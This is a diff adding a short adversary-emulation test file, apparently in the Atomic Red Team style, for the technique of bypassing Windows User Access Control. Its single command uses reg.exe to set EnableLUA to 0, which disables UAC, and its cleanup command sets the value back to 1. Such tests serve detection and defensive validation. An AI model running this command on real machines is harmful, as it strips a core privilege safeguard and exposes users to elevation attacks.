@@ -1,0 +1,11 @@
+#TechniqueName: Abuse Elevation Control Mechanism: Bypass User Access Control
+#AtomicTestName: Disable UAC using reg.exe
+#Language: cmd
+
+#commands
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+
+#cleanup_commands
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+
